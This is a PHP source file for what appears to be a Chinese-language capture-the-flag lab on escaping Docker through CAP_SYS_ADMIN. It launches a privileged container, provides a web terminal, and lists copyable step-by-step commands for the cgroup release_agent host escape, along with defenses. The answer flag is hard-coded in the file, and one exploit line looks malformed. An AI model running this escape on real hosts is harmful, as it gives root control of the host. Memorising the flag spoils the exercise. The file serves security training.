...
$CORRECT_FLAG = "flag{docker_caps_Mode_Host_Mount_Escape_Done}";
$flag_result = "";
$user_flag = "";

// Initialize session state & working directory
if (!isset($_SESSION['docker_caps_cwd'])) {
    $_SESSION['docker_caps_cwd'] = '/root';
}

if (!isset($_SESSION['docker_caps_history'])) {
    $_SESSION['docker_caps_history'] = array(
        array('type' => 'sys', 'content' => "// [Universal Linux Bash Terminal Ready: root@caps-sandbox:~#]\n// 提示：容器已赋予 CAP_SYS_ADMIN 权限！支持 capsh --print, cat /proc/1/status | grep CapEff, mount cgroup 等！\n// 推荐输入：cat /proc/1/status | grep CapEff 或 capsh --print")
    );
}

if (!isset($_SESSION['docker_caps_state'])) {
    $_SESSION['docker_caps_state'] = array(
        'checked' => false,
        'mounted' => false,
        'chrooted' => false
    );
...
if (isset($_POST['clear_history'])) {
    $_SESSION['docker_caps_history'] = array(
        array('type' => 'sys', 'content' => "// [Terminal reset: root@caps-sandbox:~#]")
    );
    $_SESSION['docker_caps_state'] = array('checked' => false, 'mounted' => false, 'chrooted' => false);
    $_SESSION['docker_caps_cwd'] = '/root';
}
...
if (isset($_POST['submit_flag'])) {
    ...
    if ($user_flag === $CORRECT_FLAG) {
        $_SESSION['docker_caps_flag'] = true;
        $flag_result = "<div class='alert alert-success' style='border-radius:10px; font-weight:700; background:rgba(16,185,129,0.15); border:1px solid #10b981; color:#10b981;'><i class='fa fa-check-circle'></i> <b>恭喜通关！</b> Flag 验证正确！已成功完成 Linux Capabilities (SYS_ADMIN) cgroup 逃逸 (+100 PTS)。</div>";
    } else {
        $flag_result = "<div class='alert alert-danger' style='border-radius:10px; font-weight:700; background:rgba(239,68,68,0.15); border:1px solid #ef4444; color:#ef4444;'><i class='fa fa-times-circle'></i> <b>Flag 错误</b>，请在 Bash 终端中完成挂载并查看 /tmp/caps_escape_flag.txt 文件！</div>";
    }
}
...
if (isset($_POST['start_sandbox'])) {
    shell_exec("/var/www/html/docker-cli rm -f pikachu-lab-caps-escape 2>&1");
    $out = shell_exec("/var/www/html/docker-cli run -d --name pikachu-lab-caps-escape --cap-add=SYS_ADMIN docker.m.daocloud.io/library/ubuntu:22.04 sleep infinity 2>&1");
    ...
    $sandbox_msg = "<div class='alert alert-success' style='border-radius:10px; font-weight:700;'><i class='fa fa-check'></i> 真实靶场容器 [pikachu-lab-caps-escape] 已部署并在后台运行！</div>";
}
if (isset($_POST['stop_sandbox'])) {
    shell_exec("/var/www/html/docker-cli rm -f pikachu-lab-caps-escape 2>&1");
    $sandbox_msg = "<div class='alert alert-warning' style='border-radius:10px; font-weight:700;'><i class='fa fa-stop'></i> 真实靶场容器 [pikachu-lab-caps-escape] 已强制销毁清理！</div>";
}

// Check Sandbox Status
$is_sandbox_running = false;
$sandbox_uptime = '';
$status_check = shell_exec("/var/www/html/docker-cli ps --filter name=^pikachu-lab-caps-escape$ --format \"{{.Names}}\t{{.Status}}\" 2>/dev/null");
$status_check = trim($status_check ?? '');
if (!empty($status_check) && strpos($status_check, 'pikachu-lab-caps-escape') !== false) {
...
if (isset($_POST['exec_cmd'])) {
    ...
    if ($raw_cmd !== '') {
        $output = dockerlab_exec_universal($raw_cmd, 'docker_caps', $_SESSION['docker_caps_state'], $_SESSION['docker_caps_cwd']);

        // Add to history
        $_SESSION['docker_caps_history'][] = array(
            'type' => 'user',
            'cmd' => $raw_cmd,
            'cwd' => $_SESSION['docker_caps_cwd'],
            'output' => $output
        );
    }
}
            ...
            <div class="cyber-stage-container">
                ...
                <div class="cyber-header-card">
                    <h1 class="cyber-header-title">
                        ⚡ 3. Docker Capabilities 逃逸 (SYS_ADMIN)
                ...
                <div class="cyber-header-card" style="border-left:4px solid #10b981; margin-bottom: 24px; display:flex; flex-direction:column; gap:16px;">
                    <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px;">
                        <div>
                            ...
                            <p style="margin:5px 0 0 0; color:var(--text-secondary); font-size:13px;">实战演练前，请先点击启动。系统将为您分配专属的隔离沙箱 <code>pikachu-lab-caps-escape</code>，用完后请销毁。</p>
                        </div>
...
docker exec pikachu-lab-caps-escape bash -c "echo 'flag{**********}' > /tmp/caps_escape_flag.txt"</div>
                    </details>
                </div>
                    ...
                    <div class="col-md-5">
                        <div class="cyber-guide-section">
                            ...
                            <div class="cyber-callout-danger">
                                ...
                                <p>当容器被赋予了 <code>CAP_SYS_ADMIN</code> 权限（系统最高特权），攻击者可以通过利用 Linux 的 Cgroups v1 特性 <code>release_agent</code> 进行逃逸。通过注册一个自定义的 release_agent 脚本，在 cgroup 进程退出时，宿主机内核会以 root 权限执行该脚本，从而完全接管物理机。</p>
                            </div>

                            <div class="cyber-callout-success">
                                <h5 style="color:#10b981; margin-top:0; font-weight:700;"><i class="fa fa-shield"></i> 最佳防御与修复方案</h5>
                                <ol>
                                    <li>坚决禁止为容器分配 <code>CAP_SYS_ADMIN</code> 权限。</li>
                                    <li>细粒度分配所需的 Capabilities。</li>
                                    <li>开启 Seccomp 和 AppArmor，限制 mount 系统调用和 cgroup 的操作。</li>
                                </ol>
                            </div>
                            ...
                            <div class="cyber-step-card">
                                <div class="cyber-step-header">
                                    ...
                                    <div class="cyber-step-title">验证 CAP_SYS_ADMIN</div>
                                </div>
                                <div class="cyber-principle-box">
                                    <b>【实战操作】</b> 检查容器内拥有的 capabilities，确认是否包含 CAP_SYS_ADMIN。
                                </div>
                                <div class="cyber-code-container">
                                    <span class="cyber-code-text">capsh --print</span>
                                    <button type="button" class="cyber-copy-btn" onclick="fillCmd('capsh --print')">填入终端</button>
                                </div>
                            </div>
                            ...
                            <div class="cyber-step-card">
                                <div class="cyber-step-header">
                                    ...
                                    <div class="cyber-step-title">挂载 cgroup v1</div>
                                </div>
                                <div class="cyber-principle-box">
                                    <b>【实战操作】</b> 在容器内部挂载 cgroups 控制器。
                                </div>
                                <div class="cyber-code-container">
                                    <span class="cyber-code-text">mkdir /tmp/cgroup_escape && mount -t cgroup -o rdma cgroup /tmp/cgroup_escape && mkdir /tmp/cgroup_escape/x</span>
                                    <button type="button" class="cyber-copy-btn" onclick="fillCmd('mkdir /tmp/cgroup_escape && mount -t cgroup -o rdma cgroup /tmp/cgroup_escape && mkdir /tmp/cgroup_escape/x')">填入终端</button>
                                </div>
                            </div>
                            ...
                            <div class="cyber-step-card">
                                <div class="cyber-step-header">
                                    <div class="cyber-step-badge">03</div>
                                    <div class="cyber-step-title">注入 release_agent 脚本</div>
                                </div>
                                <div class="cyber-principle-box">
                                    <b>【实战操作】</b> 开启 notify_on_release，并写入能够被宿主机内核执行的攻击脚本。
                                </div>
                                <div class="cyber-code-container">
                                    <span class="cyber-code-text">echo 1 > /tmp/cgroup_escape/x/notify_on_release && echo '#!/bin/bash' > /cmd.sh && echo 'cat /tmp/caps_escape_flag.txt > /flag_out.txt' >> /cmd.sh && chmod +x /cmd.sh && host_path=sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab && echo "$host_path/cmd.sh" > /tmp/cgroup_escape/release_agent</span>
                                    <button type="button" class="cyber-copy-btn" onclick="fillCmd('echo 1 > /tmp/cgroup_escape/x/notify_on_release && echo ''#!/bin/bash'' > /cmd.sh && echo ''cat /tmp/caps_escape_flag.txt > /flag_out.txt'' >> /cmd.sh && chmod +x /cmd.sh && host_path=sed -n ''s/.*\perdir=\([^,]*\).*/\1/p'' /etc/mtab && echo "$host_path/cmd.sh" > /tmp/cgroup_escape/release_agent')">填入终端</button>
                                </div>
                            </div>
                            ...
                            <div class="cyber-step-card">
                                <div class="cyber-step-header">
                                    <div class="cyber-step-badge" style="background:linear-gradient(135deg, #ef4444, #dc2626);">04</div>
                                    <div class="cyber-step-title" style="color:#ef4444;">触发释放与获取 Flag</div>
                                </div>
                                <div class="cyber-principle-box">
                                    <b>【实战操作】</b> 触发进程退出并执行释放逻辑，此时宿主机内核会执行脚本并生成 flag_out.txt。
                                </div>
                                <div class="cyber-code-container">
                                    <span class="cyber-code-text">sh -c "echo \$\$ > /tmp/cgroup_escape/x/cgroup.procs" && cat /flag_out.txt</span>
                                    <button type="button" class="cyber-copy-btn" onclick="fillCmd('sh -c "echo \$\$ > /tmp/cgroup_escape/x/cgroup.procs" && sleep 1 && cat /flag_out.txt')">填入终端</button>
                                </div>
                            </div>
                    ...
                    <div class="col-md-7">
                        <div class="cyber-terminal-card">
                            ...
                            <div class="cyber-terminal-screen" id="term_body">
                                <?php foreach ($_SESSION['docker_caps_history'] as $item): ?>
                                    <?php if ($item['type'] === 'sys'): ?>
                                        <div style="color: #64748b; margin-bottom: 12px;"><?php echo nl2br(htmlspecialchars($item['content'])); ?></div>
                                    <?php else: ?>
                                        <div>
                                            <span class="term-prompt">root@caps-sandbox:<?php echo htmlspecialchars($item['cwd'] ?? '/root'); ?># </span>
                            ...
                            <form method="POST" class="cyber-terminal-input-bar">
                                <span style="color:#10b981; font-weight:700; font-family:monospace; font-size:13px;">root@caps-sandbox:<?php echo htmlspecialchars($_SESSION['docker_caps_cwd']); ?>#</span>
                                <input type="text" id="cmd_input" name="cmd_input" placeholder="支持所有 Linux 命令（如 capsh --print / help / ls / cd / cat / uname / env ...）" autocomplete="off" required>
...
const CURRENT_CONTAINER_NAME = 'pikachu-lab-caps-escape';
